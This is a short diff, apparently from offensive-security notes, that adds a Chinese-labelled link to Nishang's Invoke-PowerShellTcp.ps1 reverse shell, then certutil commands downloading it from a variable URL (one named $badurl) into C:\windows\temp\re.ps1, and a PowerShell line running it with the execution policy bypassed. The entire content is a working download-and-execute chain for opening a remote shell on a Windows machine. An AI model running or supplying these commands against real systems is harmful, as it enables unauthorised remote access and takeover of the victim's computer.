@@ -1,0 +1,4 @@
+官方地址：https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+#certutil -urlcache -split -f $badurl/windows/script/Invoke-PowerShellTcp.ps1 C:\windows\temp\re.ps1
+certutil -urlcache -split -f $downloadurl C:\windows\temp\re.ps1
+powershell -ExecutionPolicy Bypass -File "C:\windows\temp\re.ps1"
